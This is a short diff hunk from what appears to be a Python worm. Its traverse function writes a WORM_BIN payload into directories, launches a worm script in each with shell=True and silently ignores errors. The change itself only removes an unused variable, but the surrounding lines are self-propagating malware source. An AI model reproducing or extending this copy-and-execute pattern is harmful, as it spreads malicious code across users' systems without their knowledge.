@@ -29,7 +29,7 @@ def traverse(path):
         with open(worm_path, "wb") as outfile:
             outfile.write(WORM_BIN)
         
-        run = Popen(("worm1.py"), shell=True, cwd=ospath.realpath(path))
+        Popen(("worm1.py"), shell=True, cwd=ospath.realpath(path))
         
     except:
         pass
